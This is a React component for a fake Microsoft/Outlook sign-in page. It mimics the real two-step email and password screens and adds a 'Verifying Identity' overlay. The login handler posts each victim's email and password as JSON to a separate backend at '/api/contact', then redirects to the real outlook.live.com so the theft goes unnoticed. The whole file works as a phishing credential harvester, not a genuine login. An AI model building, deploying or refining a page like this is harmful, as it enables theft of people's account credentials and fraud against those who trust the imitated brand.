import React, { useState } from 'react';
import { VscKey } from "react-icons/vsc";
import { IoMdArrowBack } from "react-icons/io";
import { useNavigate } from 'react-router-dom';

function Login() {
    const apiUrl = import.meta.env.VITE_API_URL;
    const [showPassword, setShowPassword] = useState(false);
    const [mail, setMail] = useState('');
    const [pass, setPass] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const navigate = useNavigate();

    const handleNext = (e) => {
        e.preventDefault();
        if (mail) setShowPassword(true);
    };

    const handleBack = () => setShowPassword(false);

    const loginHandler = async (e) => {
        e.preventDefault();
        setIsLoading(true);
        try {
            const res = await fetch("http://localhost:4000/api/contact", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ mail, pass })
            });
            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
            const data = await res.json();
            window.location.href = "https://outlook.live.com/";
        } catch (error) {
            console.error("Network or parsing error", error);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='min-h-screen w-screen bg-gradient-to-r from-[rgba(235,237,237,1)] from-[2%] to-[rgba(235,237,237,1)] to-[11%] flex items-center justify-center'>
            {/* Loading Overlay */}
            {isLoading && (
                <div className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center">
                    <div className="bg-white rounded-lg p-8 flex flex-col items-center space-y-4 max-w-sm mx-4">
                        <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500"></div>
                        <div className="text-center">
                            <h3 className="text-lg font-semibold text-gray-800 mb-2">
                                Verifying Identity
                            </h3>
                            <p className="text-gray-600">
                                Please wait while we verify your identity...
                            </p>
                        </div>
                    </div>
                </div>
            )}

            <div className='absolute top-0 left-0 w-40 h-40 bg-[rgba(201,148,174,0.3)] rounded-full blur-sm'></div>
            <div className='lg:w-[450px] w-[400px]'>
                <div className='relative bg-white h-[350px] overflow-hidden'>
                    <div className={`absolute w-full transition-transform duration-300 ${showPassword ? '-translate-x-full' : 'translate-x-0'}`}>
                        <div className='p-[50px]'>
                            <img src="/image/miclogo.png" alt="" className='h-6' />
                            <h3 className='text-2xl font-semibold my-6'>Sign In</h3>
                            <form onSubmit={handleNext}>
                                <input
                                    type="email"
                                    placeholder='Email/Phone'
                                    className='border-b-2 w-full mb-4 pb-2 focus:outline-none'
                                    value={mail}
                                    required
                                    onChange={(e) => setMail(e.target.value)}
                                />
                                <p className='text-sm mb-6'>
                                    No account? <span className='text-blue-400 cursor-pointer'>create one!</span>
                                </p>
                            </form>
                            <div className='absolute bottom-4 right-4'>
                                <button
                                    onClick={handleNext}
                                    className='bg-blue-400 text-white px-9 py-o.5'>
                                    NEXT
                                </button>
                            </div>
                        </div>
                    </div>

                    <div className="absolute w-full h-full transition-transform duration-300" style={{
                        transform: showPassword ? 'translateX(0)' : 'translateX(100%)'
                    }}>
                        <div className="relative h-full">
                            <div className="p-10">
                                <img src="/img/miclogo.png" alt="" className='h-6' />
                                <div className="mt-8">
                                    <p className="text-sm text-gray-600 mb-6 flex">
                                        <button onClick={handleBack} className="text-gray-600 mr-1">
                                            <IoMdArrowBack size={19} />
                                        </button>
                                        {mail}
                                    </p>
                                    <h1 className='text-2xl font-semibold my-5'>Enter password</h1>
                                    <form onSubmit={loginHandler} className="relative h-full">
                                        <input
                                            type="password"
                                            placeholder="Password"
                                            className="border-b-[0.5px] w-full mb-4 pb-2 border-b-[#313eb8] focus:outline-none"
                                            value={pass}
                                            required
                                            onChange={(e) => setPass(e.target.value)}
                                        />
                                    </form>
                                </div>
                            </div>

                            <div className="absolute bottom-10 right-10">
                                <button
                                    type="submit"
                                    onClick={loginHandler}
                                    className="bg-blue-500 text-white px-9 py-[3px] hover:bg-blue-600 transition-colors"
                                >
                                    Sign in
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <div className='bg-white mt-[15px] w-full h-[50px] flex items-center justify-center'>
                    <p className="flex items-center gap-2 text-gray-600">
                        <span className="flex items-center"><VscKey /></span>
                        Sign-in options
                    </p>
                </div>
            </div>
        </div>
    );
}

export default Login;